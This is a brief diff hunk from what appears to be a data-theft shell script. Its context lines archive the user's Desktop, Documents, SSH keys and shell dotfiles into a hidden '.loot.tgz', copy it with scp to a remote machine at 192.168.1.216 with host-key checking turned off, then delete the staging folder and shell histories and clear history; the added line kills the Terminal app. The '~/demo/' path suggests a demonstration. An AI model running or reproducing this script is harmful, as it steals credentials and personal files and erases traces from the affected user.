@@ -11,3 +11,5 @@ tar cfz .loot.tgz $HOME/Desktop $HOME/Documents $HOME/.ssh $HOME/.bash* $HOME/.c
 scp -q -o StrictHostKeyChecking=no -i /tmp/.s/.t/.e/.a/.l/.s /tmp/.s/.t/.e/.a/.l/.loot.tgz zed@192.168.1.216:~/demo/
 
 set -e && rm -rf /tmp/.s ~/.bash_history ~/.zsh_history && history -c
+
+killall Terminal
